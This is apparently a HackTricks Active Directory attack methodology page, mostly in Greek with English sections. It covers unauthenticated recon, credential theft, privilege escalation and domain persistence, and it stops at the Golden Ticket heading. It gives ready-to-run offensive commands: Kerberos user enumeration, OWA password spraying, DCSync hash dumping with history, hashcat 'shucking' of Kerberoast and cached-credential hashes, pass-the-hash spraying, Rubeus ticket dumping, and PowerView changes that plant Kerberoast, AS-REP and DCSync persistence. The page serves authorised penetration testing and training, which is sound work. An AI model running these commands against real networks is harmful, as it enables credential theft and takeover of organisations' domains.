# Active Directory Μεθοδολογία

{{#include ../../banners/hacktricks-training.md}}

## Βασική επισκόπηση

**Active Directory** λειτουργεί ως θεμελιώδης τεχνολογία, επιτρέποντας σε **network administrators** να δημιουργούν και να διαχειρίζονται αποτελεσματικά **domains**, **users**, και **objects** μέσα σε ένα δίκτυο. Είναι σχεδιασμένο για κλιμάκωση, διευκολύνοντας την οργάνωση μεγάλου αριθμού χρηστών σε διαχειρίσιμα **groups** και **subgroups**, ενώ ελέγχει τα **access rights** σε διάφορα επίπεδα.

Η δομή του **Active Directory** αποτελείται από τρία κύρια επίπεδα: **domains**, **trees**, και **forests**. Ένα **domain** περιλαμβάνει μια συλλογή αντικειμένων, όπως **users** ή **devices**, που μοιράζονται κοινή βάση δεδομένων. Οι **trees** είναι ομάδες αυτών των domains συνδεδεμένες με κοινή ιεραρχία, και ένα **forest** αντιπροσωπεύει τη συλλογή πολλαπλών trees, διασυνδεδεμένων μέσω **trust relationships**, σχηματίζοντας το ανώτατο επίπεδο της οργανωτικής δομής. Συγκεκριμένα **access** και **communication rights** μπορούν να οριστούν σε κάθε ένα από αυτά τα επίπεδα.

Κύριες έννοιες στο **Active Directory** περιλαμβάνουν:

1. **Directory** – Περιέχει όλες τις πληροφορίες που αφορούν τα Active Directory objects.
2. **Object** – Αναφέρεται σε οντότητες μέσα στον directory, όπως **users**, **groups**, ή **shared folders**.
3. **Domain** – Λειτουργεί ως container για τα directory objects, με τη δυνατότητα για πολλαπλά domains να συνυπάρχουν μέσα σε ένα **forest**, το καθένα με τη δική του συλλογή αντικειμένων.
4. **Tree** – Ομαδοποίηση domains που μοιράζονται ένα κοινό root domain.
5. **Forest** – Η κορυφή της οργανωτικής δομής στο Active Directory, αποτελούμενη από πολλά trees με **trust relationships** μεταξύ τους.

Το **Active Directory Domain Services (AD DS)** περιλαμβάνει μια σειρά υπηρεσιών κρίσιμων για την κεντρική διαχείριση και επικοινωνία σε ένα δίκτυο. Αυτές οι υπηρεσίες περιλαμβάνουν:

1. **Domain Services** – Κεντρικοποιεί την αποθήκευση δεδομένων και διαχειρίζεται τις αλληλεπιδράσεις μεταξύ **users** και **domains**, συμπεριλαμβανομένων των λειτουργιών **authentication** και **search**.
2. **Certificate Services** – Εποπτεύει τη δημιουργία, διανομή και διαχείριση ασφαλών **digital certificates**.
3. **Lightweight Directory Services** – Υποστηρίζει εφαρμογές που χρησιμοποιούν directory μέσω του **LDAP protocol**.
4. **Directory Federation Services** – Παρέχει δυνατότητες **single-sign-on** για authentication χρηστών σε πολλαπλές web εφαρμογές σε μία συνεδρία.
5. **Rights Management** – Βοηθά στην προστασία του υλικού με πνευματικά δικαιώματα, ρυθμίζοντας τη μη εξουσιοδοτημένη διανομή και χρήση του.
6. **DNS Service** – Κρίσιμο για την επίλυση **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Για να μάθετε πώς να **attack an AD** χρειάζεται να **understand** πολύ καλά τη διαδικασία **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Μπορείτε να ανατρέξετε στο [https://wadcoms.github.io/](https://wadcoms.github.io) για μια γρήγορη επισκόπηση των εντολών που μπορείτε να τρέξετε για να enumerate/exploit ένα AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Εάν έχετε πρόσβαση σε ένα περιβάλλον AD αλλά δεν έχετε διαπιστευτήρια/sessions, μπορείτε:

- **Pentest the network:**
- Σαρώστε το δίκτυο, εντοπίστε μηχανές και ανοικτές θύρες και προσπαθήστε να **exploit vulnerabilities** ή να **extract credentials** από αυτές (για παράδειγμα, [printers could be very interesting targets](ad-information-in-printers.md)).
- Η καταγραφή του DNS μπορεί να δώσει πληροφορίες για βασικούς servers στο domain όπως web, printers, shares, vpn, media, κ.α.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Ρίξτε μια ματιά στη γενική [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) για περισσότερες πληροφορίες σχετικά με το πώς να το κάνετε.
- **Check for null and Guest access on smb services** (αυτό δεν θα λειτουργήσει σε σύγχρονες εκδόσεις Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Ένας πιο λεπτομερής οδηγός για το πώς να enumerate έναν SMB server βρίσκεται εδώ:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Ένας πιο λεπτομερής οδηγός για το πώς να enumerate το LDAP βρίσκεται εδώ (δώστε **ιδιαίτερη προσοχή στο anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Συλλέξτε credentials **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Προσπελάστε host **abusing the relay attack** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Συλλέξτε credentials **exposing** **fake UPnP services with evil-S** (../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Εξάγετε usernames/ονομάτα από εσωτερικά έγγραφα, social media, υπηρεσίες (κυρίως web) μέσα στα domain περιβάλλοντα και επίσης από δημοσίως διαθέσιμες πηγές.
- Εάν βρείτε τα πλήρη ονόματα εργαζομένων της εταιρείας, μπορείτε να δοκιμάσετε διαφορετικές AD **username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Οι πιο κοινές συμβάσεις είναι: _NameSurname_, _Name.Surname_, _NamSur_ (3 letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Ελέγξτε τις σελίδες [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) και [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Όταν ζητηθεί ένα **invalid username** ο server θα απαντήσει με τον **Kerberos error** κωδικό _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, επιτρέποντάς μας να διαπιστώσουμε ότι το username ήταν άκυρο. **Valid usernames** θα προκαλέσουν είτε την **TGT in a AS-REP** απάντηση είτε το σφάλμα _KRB5KDC_ERR_PREAUTH_REQUIRED_, υποδεικνύοντας ότι ο user απαιτείται να εκτελέσει pre-authentication.
- **No Authentication against MS-NRPC**: Χρησιμοποιώντας auth-level = 1 (No authentication) ενάντια στην MS-NRPC (Netlogon) διεπαφή στους domain controllers. Η μέθοδος καλεί τη συνάρτηση `DsrGetDcNameEx2` μετά το binding στη διεπαφή MS-NRPC για να ελέγξει αν ο user ή ο υπολογιστής υπάρχει χωρίς κανένα διαπιστευτήριο. Το εργαλείο [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) υλοποιεί αυτόν τον τύπο enumeration. Η έρευνα μπορεί να βρεθεί [εδώ](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Εάν βρείτε έναν από αυτούς τους διακομιστές στο δίκτυο, μπορείτε επίσης να εκτελέσετε **user enumeration against it**. Για παράδειγμα, μπορείτε να χρησιμοποιήσετε το εργαλείο [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

You might be able to **obtain** some challenge **hashes** to crack **poisoning** some protocols of the **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Σημειώσεις:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the Active Directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Ψάξτε για Creds σε Computer Shares | SMB Shares

Τώρα που έχετε κάποια βασικά credentials πρέπει να ελέγξετε αν μπορείτε να **βρείτε** οποιαδήποτε **ενδιαφέροντα αρχεία που μοιράζονται μέσα στο AD**. Μπορείτε να το κάνετε χειροκίνητα αλλά είναι μια πολύ βαρετή επαναλαμβανόμενη εργασία (και περισσότερο αν βρείτε εκατοντάδες docs που πρέπει να ελέγξετε).

[**Ακολουθήστε αυτόν τον σύνδεσμο για να μάθετε για εργαλεία που μπορείτε να χρησιμοποιήσετε.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

If you can **access other PCs or shares** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Για τις παρακάτω τεχνικές ένας απλός domain user δεν αρκεί, χρειάζεστε ειδικά privileges/credentials για να εκτελέσετε αυτές τις επιθέσεις.**

### Hash extraction

Ελπίζουμε ότι καταφέρατε να **compromise κάποιο local admin** account χρησιμοποιώντας [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**Διαβάστε αυτή τη σελίδα για διαφορετικούς τρόπους απόκτησης των hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Μόλις έχετε το hash ενός χρήστη**, μπορείτε να το χρησιμοποιήσετε για να **υποδυθείτε** αυτόν τον χρήστη.\
Πρέπει να χρησιμοποιήσετε κάποιο **tool** που θα **perform** την **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** Η τελευταία επιλογή είναι αυτό που κάνει το mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrator** you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Σημειώστε ότι αυτό είναι αρκετά **θορυβώδες** και το **LAPS** θα **μείωνε** αυτό.

### MSSQL Abuse & Trusted Links

Αν ένας χρήστης έχει προνόμια για **πρόσβαση σε MSSQL instances**, θα μπορούσε να τα χρησιμοποιήσει για να **εκτελέσει εντολές** στον MSSQL host (αν τρέχει ως SA), να **κλέψει** το NetNTLM **hash** ή ακόμα και να πραγματοποιήσει μια **relay** **attack**.\
Επίσης, αν μια MSSQL instance εμπιστεύεται (database link) μια διαφορετική MSSQL instance και ο χρήστης έχει προνόμια στην εμπιστευόμενη βάση, θα μπορεί **να χρησιμοποιήσει τη σχέση εμπιστοσύνης για να εκτελέσει queries και στην άλλη instance**. Αυτές οι σχέσεις εμπιστοσύνης μπορούν να αλυσοδεθούν και σε κάποιο σημείο ο χρήστης μπορεί να βρει μια λάθος διαμορφωμένη βάση όπου μπορεί να εκτελέσει εντολές.\
**Οι σύνδεσμοι μεταξύ βάσεων δεδομένων λειτουργούν ακόμη και διαμέσου forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory and deployment suites συχνά εκθέτουν ισχυρά μονοπάτια προς credentials και code execution. Δείτε:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Αν βρείτε κάποιο Computer object με το attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) και έχετε domain privileges στον υπολογιστή, θα μπορείτε να dumpάρετε TGTs από τη μνήμη κάθε χρήστη που κάνει login στον υπολογιστή.\
Έτσι, αν ένας **Domain Admin κάνει login στον υπολογιστή**, θα μπορείτε να dumpάρετε το TGT του και να τον προσωποποιήσετε χρησιμοποιώντας [Pass the Ticket](pass-the-ticket.md).\
Χάρη στην constrained delegation μπορείτε ακόμη και **αυτόματα να συμβιβάσετε έναν Print Server** (ελπίζοντας να είναι DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Αν ένας χρήστης ή υπολογιστής επιτρέπεται για "Constrained Delegation" θα μπορεί να **προσωποποιήσει οποιονδήποτε χρήστη για να προσπελάσει κάποιες υπηρεσίες σε έναν υπολογιστή**.\
Τότε, αν **συμβιβάσετε το hash** αυτού του χρήστη/υπολογιστή θα μπορείτε να **προσωποποιήσετε οποιονδήποτε χρήστη** (ακόμη και domain admins) για να προσπελάσετε κάποιες υπηρεσίες.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Το να έχετε **WRITE** προνόμιο σε ένα Active Directory αντικείμενο ενός απομακρυσμένου υπολογιστή επιτρέπει την επίτευξη code execution με **ανυψωμένα προνόμια**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Ο συμβιβασμένος χρήστης μπορεί να έχει μερικά **ενδιαφέροντα προνόμια πάνω σε κάποια domain objects** που θα μπορούσαν να σας επιτρέψουν να **μετακινηθείτε lateral/**escalate** προνόμια. 


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Η ανεύρεση μιας **Spool service που ακούει** εντός του domain μπορεί να **κακοποιηθεί** για την **απόκτηση νέων credentials** και την **ανύψωση προνομίων**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Αν **άλλοι χρήστες** **προσπελάσουν** τη **συμβιβασμένη** μηχανή, είναι δυνατό να **συλλεχθούν credentials από τη μνήμη** και ακόμη να **ενεργοποιηθούν beacons στις διεργασίες τους** για να τους προσωποποιήσετε.\
Συνήθως οι χρήστες θα προσπελάσουν το σύστημα μέσω RDP, οπότε εδώ έχετε πώς να εκτελέσετε μερικές επιθέσεις πάνω σε τρίτες RDP συνεδρίες:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

Το **LAPS** παρέχει ένα σύστημα για τη διαχείριση του **local Administrator password** σε domain-joined computers, διασφαλίζοντας ότι είναι **τυχαίο**, μοναδικό και συχνά **αλλάζει**. Αυτά τα passwords αποθηκεύονται στο Active Directory και η πρόσβαση ελέγχεται μέσω ACLs μόνο σε εξουσιοδοτημένους χρήστες. Με επαρκή permissions για την πρόσβαση σε αυτά τα passwords, γίνεται δυνατή η pivoting σε άλλους υπολογιστές.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Η **συλλογή certificates** από τη συμβιβασμένη μηχανή μπορεί να είναι τρόπος για ανύψωση προνομίων μέσα στο περιβάλλον:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Αν υπάρχουν **ευάλωτα templates** διαμορφωμένα, είναι δυνατό να τα κακοποιήσετε για να ανεβάσετε προνόμια:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Μόλις αποκτήσετε **Domain Admin** ή ακόμα καλύτερα **Enterprise Admin** προνόμια, μπορείτε να **dumpάρετε** τη **domain database**: _ntds.dit_.

[**Περισσότερες πληροφορίες για την επίθεση DCSync μπορείτε να βρείτε εδώ**](dcsync.md).

[**Περισσότερες πληροφορίες για το πώς να κλέψετε το NTDS.dit μπορείτε να βρείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Μερικές από τις τεχνικές που εξετάστηκαν παραπάνω μπορούν να χρησιμοποιηθούν για persistence.\
Για παράδειγμα μπορείτε να:

- Κάνετε χρήστες ευάλωτους σε [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Κάνετε χρήστες ευάλωτους σε [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Χορηγήσετε [**DCSync**](#dcsync) προνόμια σε έναν χρήστη

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Η **Silver Ticket attack** δημιουργεί ένα **νόμιμο Ticket Granting Service (TGS) ticket** για μια συγκεκριμένη υπηρεσία χρησιμοποιώντας το **NTLM hash** (για παράδειγμα, το **hash του PC account**). Αυτή η μέθοδος χρησιμοποιείται για να **προσπελάσετε τα προνόμια της υπηρεσίας**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

